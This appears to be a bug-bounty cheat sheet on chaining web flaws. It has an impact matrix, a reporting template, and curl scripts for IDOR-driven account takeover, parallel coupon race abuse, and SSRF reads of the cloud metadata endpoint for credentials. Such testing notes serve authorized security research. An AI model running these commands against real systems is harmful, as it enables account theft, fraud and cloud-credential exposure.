# CHAIN CONSTRUCTION — EXECUTION

## CHAIN MATRIX
| Primary | + Chain With | = Impact | CVSS |
|---------|-------------|----------|------|
| IDOR | Email Change | ATO (change email → reset password) | 8.0-9.0 |
| IDOR | No Rate Limit | Mass Data Exfil (10k+ records) | 7.5-9.5 |
| Coupon Race | Wallet Drain | Unlimited Discounts | 7.0-8.5 |
| OTP Reuse | Password Reset | ATO (reuse OTP, change password) | 8.0-9.0 |
| MFA Bypass | PrivEsc | Admin Access | 8.5-9.5 |
| Mass Assignment | IDOR | Admin + All Data | 9.0-10.0 |
| Race Condition | Refund | Double Refund → Free Money | 7.0-9.0 |
| Cross-Tenant | IDOR | Mass Data Breach (all orgs) | 9.0-10.0 |
| SSRF | Cloud Metadata | AWS Keys → S3 Access | 8.0-9.0 |
| Open Redirect | OAuth Theft | ATO via Token Theft | 7.5-8.5 |

## CHAIN TESTING: CURL
```bash
# Chain IDOR → Email Change → ATO
# Step 1: IDOR to get victim email
victim_email=$(curl -s "/api/user/42/email" -b "session=A" | jq -r '.email')
# Step 2: Change your email to victim's
curl -X PATCH /api/profile -d "email=$victim_email" -b "session=A"
# Step 3: Request password reset
curl -X POST /api/forgot -d "email=$victim_email"
# → Reset link goes to YOU → ATO

# Chain Race Condition → Coupon Abuse
for i in {1..50}; do
  (curl -X POST /api/apply-coupon -d '{"code":"WELCOME20"}' \
    -H "Cookie: A" &>/dev/null) &
done; wait
# Then check if 50× discount applied

# Chain SSRF → Cloud Metadata
# If you find SSRF in PDF generator or webhook:
curl -X POST /api/generate-pdf -d '{"url":"http://169.254.169.254/latest/meta-data/"}' -b "session=A"
```

## CHAIN VALIDATION: all 3 must pass
1. Each step independently reproducible from zero state
2. Step A output is required for Step B input (not standalone)
3. Final impact is real (money, PII, admin access)

## CHAIN REPORTING TEMPLATE
```markdown
# Chain: IDOR → Email Change → ATO (CVSS 8.5)
**Step 1 (IDOR):** GET /api/user/42/email returns victim@v.com
**Step 2 (Email Change):** PATCH /api/profile to victim@v.com succeeds without verify
**Step 3 (Password Reset):** POST /api/forgot sends reset to victim@v.com → attacker inbox
**Impact:** Full ATO of victim@v.com (any user ID 1-10000)
```
